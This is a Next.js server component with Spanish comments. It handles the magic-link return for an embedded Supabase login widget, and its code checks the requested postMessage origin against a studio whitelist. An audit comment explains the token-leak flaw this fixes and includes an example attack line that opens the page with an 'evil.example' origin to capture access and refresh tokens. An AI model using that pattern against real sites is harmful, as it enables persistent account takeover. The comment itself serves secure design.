// Puente del magic link para el widget embebido (Modo B, Shadow DOM).
//
// El bundle corre en el DOM del ESTUDIO, así que no puede recibir el retorno
// de un enlace mágico directamente: `detectSessionInUrl` de Supabase solo
// procesa el fragmento de la URL en la pestaña que lo carga, y esa pestaña es
// esta (tentare.app), no la ventana del sitio del estudio. El widget abre
// esta página en una pestaña/ventana aparte (`window.open`, ver
// lib/widget/usar-auth-widget.ts); en cuanto aquí hay sesión, se la pasamos
// de vuelta por `postMessage` al `opener` y esta pestaña se cierra sola.
//
// 🔴 AUDITORÍA 21-ago — POR QUÉ ESTA PÁGINA ES UN SERVER COMPONENT.
// `origenEstudio` llega por query string y era el `targetOrigin` del
// postMessage TAL CUAL, sin validarse contra nada. Como `intentar()` no exige
// que el enlace mágico se acabe de consumir en esta navegación (lee la sesión
// que YA hubiera en el localStorage de tentare.app, que es la del portal de la
// socia), cualquier web podía hacer:
//
//   window.open('<origen de Tentare>/widget-auth-retorno?slug=x
//                &origenEstudio=https://evil.example')
//
// y recibir el `access_token` Y el `refresh_token` de la socia — cuenta
// comprometida de forma persistente, porque el refresh token se renueva solo.
// El comentario que había ("viene del propio widget, no de datos ajenos")
// describía el caso feliz, no una garantía: nada impedía que lo abriera otro.
//
// Ahora el origen se resuelve EN SERVIDOR contra
// `studios.widget_dominios_autorizados` (la misma lista blanca que gobierna el
// CORS del widget, lib/cors-widget.ts). Si el origen pedido no está en la lista
// del estudio del `slug`, no se emite ningún token: el cliente recibe `null` y
// enseña el error. Es la misma propiedad que el módulo de CORS ya promete —
// "solo estas webs pueden hablar con el widget de este estudio"—, aplicada al
// único sitio por el que salían credenciales.
//
// Ver docs/auth-widget-diseno.md §2 para el diseño completo, incluido el
// spike pendiente de validar en Safari real con "Prevent Cross-Site
// Tracking" — este flujo no se ha probado todavía fuera de este repo.
import { origenPermitido } from '@/lib/cors-widget';
import { WidgetAuthRetornoCliente } from './cliente';

export default async function WidgetAuthRetorno({
  searchParams,
}: {
  searchParams: Promise<{ slug?: string; origenEstudio?: string }>;
}) {
  const { slug, origenEstudio } = await searchParams;
  // Sin slug no hay estudio contra el que resolver la lista blanca, así que no
  // hay forma de autorizar ningún destino: se rechaza sin consultar nada.
  const destino = slug && origenEstudio
    ? await origenPermitido({ slug }, origenEstudio)
    : null;
  return <WidgetAuthRetornoCliente origenEstudio={destino} />;
}
